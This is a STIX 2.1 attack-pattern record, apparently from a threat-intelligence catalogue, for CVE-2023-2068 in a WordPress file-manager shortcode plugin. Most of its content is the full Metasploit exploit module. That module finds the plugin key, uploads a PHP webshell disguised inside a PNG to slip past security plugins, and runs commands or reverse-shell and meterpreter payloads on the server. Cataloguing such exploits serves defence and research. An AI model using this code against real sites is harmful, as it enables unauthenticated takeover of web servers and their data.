{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d8342cc5-097a-402d-a9b8-50b889961cf0",
    "created": "2024-08-14T17:11:28.929165Z",
    "modified": "2024-08-14T17:11:28.929169Z",
    "name": "Wordpress File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution through shortcode",
    "description": " The Wordpress plugin does not adequately prevent uploading files with disallowed MIME types when using the shortcode. This leads to RCE in cases where the allowed MIME type list does not include PHP files. In the worst case, this is available to unauthenticated users, but is also works in an authenticated configuration. File Manager Advanced Shortcode plugin version `2.3.2` and lower are vulnerable. To install the Shortcode plugin File Manager Advanced version `5.0.5` or lower is required to keep the configuration vulnerable. Any user privileges can exploit this vulnerability which results in access to the underlying operating system with the same privileges under which the Wordpress web services run. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_plugin_fma_shortcode_unauth_rce.rb",
            "external_id": "wp_plugin_fma_shortcode_unauth_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-2068"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/JncRCWZ5xm/cve-2023-2068"
        },
        {
            "source_name": "WPVDB",
            "external_id": "58f72953-56d2-4d86-a49b-311b5fc58056"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Format::PhpPayloadPng\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution through shortcode',\n        'Description' => %q{\n          The Wordpress plugin does not adequately prevent uploading files with disallowed MIME types when using the shortcode.\n          This leads to RCE in cases where the allowed MIME type list does not include PHP files.\n          In the worst case, this is available to unauthenticated users, but is also works in an authenticated configuration.\n          File Manager Advanced Shortcode plugin version `2.3.2` and lower are vulnerable.\n          To install the Shortcode plugin File Manager Advanced version `5.0.5` or lower is required to keep the configuration\n          vulnerable. Any user privileges can exploit this vulnerability which results in access to the underlying operating system\n          with the same privileges under which the Wordpress web services run.\u00a0\n        },\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module\n          'Mateus Machado Tesser' # discovery\n        ],\n        'References' => [\n          ['CVE', '2023-2068'],\n          ['URL', 'https://attackerkb.com/topics/JncRCWZ5xm/cve-2023-2068'],\n          ['PACKETSTORM', '172707'],\n          ['WPVDB', '58f72953-56d2-4d86-a49b-311b5fc58056']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => ['windows', 'unix', 'linux', 'php'],\n        'Privileged' => false,\n        'Arch' => [ARCH_CMD, ARCH_PHP, ARCH_X64, ARCH_X86, ARCH_AARCH64],\n        'Targets' => [\n          [\n            'PHP',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Type' => :php,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],\n              'Type' => :linux_dropper,\n              'Linemax' => 65535,\n              'CmdStagerFlavor' => ['wget', 'curl', 'printf', 'bourne'],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :windows_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'Type' => :windows_dropper,\n              'Linemax' => 3000,\n              'CmdStagerFlavor' => ['psh_invokewebrequest', 'vbs', 'debug_asm', 'debug_write', 'certutil'],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-05-31',\n        'DefaultOptions' => {\n          'SSL' => false,\n          'RPORT' => 80\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'File Manager Advanced (FMA) Shortcode URI path', '/']),\n        OptString.new('WEBSHELL', [\n          false, 'The name of the webshell with extension php. Webshell name will be randomly generated if left unset.', nil\n        ]),\n        OptEnum.new('COMMAND',\n                    [true, 'Use PHP command function', 'passthru', %w[passthru shell_exec system exec]], conditions: %w[TARGET != 0])\n      ]\n    )\n  end\n\n  def get_form_data(png_webshell)\n    # construct multipart form data\n    form_data = Rex::MIME::Message.new\n    form_data.add_part('', nil, nil, 'form-data; name=\"reqid\"')\n    form_data.add_part('upload', nil, nil, 'form-data; name=\"cmd\"')\n    form_data.add_part('l1_Lw', nil, nil, 'form-data; name=\"target\"')\n    form_data.add_part('fma_load_shortcode_fma_ui', nil, nil, 'form-data; name=\"action\"')\n    form_data.add_part(@wp_data['fmakey'].to_s, nil, nil, 'form-data; name=\"_fmakey\"')\n    form_data.add_part(@upload_path.to_s, nil, nil, 'form-data; name=\"path\"')\n    form_data.add_part('', nil, nil, 'form-data; name=\"url\"')\n    form_data.add_part('false', nil, nil, 'form-data; name=\"w\"')\n    form_data.add_part('true', nil, nil, 'form-data; name=\"r\"')\n    form_data.add_part('plugins', nil, nil, 'form-data; name=\"hide\"')\n    form_data.add_part('upload,download', nil, nil, 'form-data; name=\"operations\"')\n    form_data.add_part('inside', nil, nil, 'form-data; name=\"path_type\"')\n    form_data.add_part('no', nil, nil, 'form-data; name=\"hide_path\"')\n    form_data.add_part('no', nil, nil, 'form-data; name=\"enable_trash\"')\n    form_data.add_part('image/png,text/x-php', nil, nil, 'form-data; name=\"upload_allow\"')\n    form_data.add_part('2G', nil, nil, 'form-data; name=\"upload_max_size\"')\n    form_data.add_part(png_webshell.to_s, 'image/png, text/x-php', 'binary', \"form-data; name=\\\"upload[]\\\"; filename=\\\"#{@webshell_name}\\\"\")\n    form_data.add_part('', nil, nil, 'form-data; name=\"mtime[]\"')\n    return form_data\n  end\n\n  def upload_webshell\n    # randomize file name if option WEBSHELL is not set\n    @webshell_name = (datastore['WEBSHELL'].blank? ? \"#{Rex::Text.rand_text_alpha(8..16)}.php\" : datastore['WEBSHELL'].to_s)\n\n    @post_param = Rex::Text.rand_text_alphanumeric(1..8)\n    @get_param = Rex::Text.rand_text_alphanumeric(1..8)\n\n    payload = if target['Type'] == :php\n                \"<?php @eval(base64_decode($_POST[\\'#{@post_param}\\']));?>\"\n              else\n                \"<?=$_GET[\\'#{@get_param}\\'](base64_decode($_POST[\\'#{@post_param}\\']));?>\"\n              end\n\n    # inject PHP payload into the PLTE chunk of the PNG image to bypass security such as Wordfence\n    png_webshell = inject_php_payload_png(payload, injection_method: 'PLTE')\n    if png_webshell.nil?\n      return false\n    end\n\n    # Upload payload in Wordpress root for execution\n    # try again at the configured upload directory if LFI fails\n    @upload_path = ''\n    no_break = true\n    loop do\n      form_data = get_form_data(png_webshell)\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri('/', @wp_data['baseurl'], 'wp-admin', 'admin-ajax.php'),\n        'ctype' => \"multipart/form-data; boundary=#{form_data.bound}\",\n        'data' => form_data.to_s\n      })\n      if res && res.code == 200 && !res.body.blank?\n        # parse json to find the webshell name embedded in the response at the \"added\" section that indicates a successful upload\n        res_json = res.get_json_document\n        return false if res_json.blank?\n        return true if res_json.dig('added', 0, 'name') == @webshell_name\n\n        # If we face an upload permission error, use the configured upload directory path to upload the payload\n        # We might not have execution rights there, but at least we can try ;-)\n        if res_json.dig('warning', 0) == 'errUploadFile' && res_json.dig('warning', 2) == 'errPerm' && no_break\n          @upload_path = @wp_data['path']\n          no_break = false\n        else\n          return false\n        end\n      else\n        return false\n      end\n    end\n  end\n\n  def execute_php(cmd, _opts = {})\n    payload = Base64.strict_encode64(cmd)\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri('/', @wp_data['baseurl'], @upload_path, @webshell_name),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        @post_param => payload\n      }\n    })\n  end\n\n  def execute_command(cmd, _opts = {})\n    payload = Base64.strict_encode64(cmd)\n    php_cmd_function = datastore['COMMAND']\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri('/', @wp_data['baseurl'], @upload_path, @webshell_name),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_get' => {\n        @get_param => php_cmd_function\n      },\n      'vars_post' => {\n        @post_param => payload\n      }\n    })\n  end\n\n  def check_fma_shortcode_plugin\n    # check if fma shortcode plugin is installed and return fmakey, upload directory path and Wordpress base url\n    @wp_data = {}\n    res = send_request_cgi!({\n      'method' => 'GET',\n      'uri' => normalize_uri(datastore['TARGETURI'])\n    })\n    if res && res.body && res.code == 200\n      # 1. Get the fmakey information by searching for strings:\n      # /_fmakey: '1555ef603c',/ or /_fmakey:'1555ef603c',/ or /\"fmakey\":\"1555ef603c\",/\n      fmakey_match1 = res.body.match(/_fmakey:.*'.*',/)\n      fmakey_match2 = res.body.match(/\"fmakey\":\".*\",/)\n      return if fmakey_match1.nil? && fmakey_match2.nil?\n\n      if fmakey_match1\n        @wp_data['fmakey'] = fmakey_match1[0].split(',')[0].split(':')[1].tr('\\'', '').strip\n      else\n        @wp_data['fmakey'] = fmakey_match2[0].split(',')[0].split(':')[1].tr('\"', '').strip\n      end\n\n      # 2. Get the upload directory path information by searching for strings:\n      # /path: 'upload',/ or /path:'upload',/ or /\"path\":\"upload\",/\n      path_match1 = res.body.match(/path:.*'.*',/)\n      path_match2 = res.body.match(/\"path\":\".*\",/)\n      return if path_match1.nil? && path_match2.nil?\n\n      if path_match1\n        @wp_data['path'] = path_match1[0].split(',')[0].split(':')[1].tr('\\'', '').strip\n      else\n        @wp_data['path'] = path_match2[0].split(',')[0].split(':')[1].tr('\"', '').strip\n      end\n\n      # 3. Determine Wordpress baseurl\n      # search in html content for:\n      # <script src='http(s)://ip/<wp-base>/wp-content/plugins/file-manager-advanced-shortcode/js/shortcode.js?ver=6.2.2' id='fma-shortcode-js-js'></script>\n      # split off /wp-content and http(s)://ip part to determine the <wp-base> which can be empty.\n      baseurl_match = res.body.match(%r{src=.*wp-content/plugins/file-manager-advanced-shortcode/})\n      return if baseurl_match.nil?\n\n      @wp_data['baseurl'] = baseurl_match[0].split('/wp-content')[0].split('/')[3]\n    end\n  end\n\n  def check\n    return CheckCode::Safe('Server not online or not detected as WordPress.') unless wordpress_and_online?\n\n    check_fma_shortcode_plugin\n    return CheckCode::Safe(\"Could not find fmakey. Shortcode plugin not installed or check your TARGETURI \\\"#{datastore['TARGETURI']}\\\" setting.\") if @wp_data['fmakey'].nil?\n\n    CheckCode::Appears(\"fmakey successfully retrieved: #{@wp_data['fmakey']}\")\n  end\n\n  def exploit\n    # check if fmakey is already set from the check method otherwise try to find the key.\n    check_fma_shortcode_plugin unless datastore['AutoCheck']\n    fail_with(Failure::NotVulnerable, \"Could not find fmakey. Shortcode plugin not installed or check your TARGETURI \\\"#{datastore['TARGETURI']}\\\" setting.\") if @wp_data['fmakey'].nil?\n\n    fail_with(Failure::NotVulnerable, \"Webshell #{@webshell_name} upload failed.\") unless upload_webshell\n    register_file_for_cleanup(@webshell_name.to_s)\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :php\n      execute_php(payload.encoded)\n    when :unix_cmd, :windows_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper, :windows_dropper\n      execute_cmdstager({ linemax: target.opts['Linemax'] })\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-05-31",
    "x_mitre_platforms": [
        "win'"
    ]
}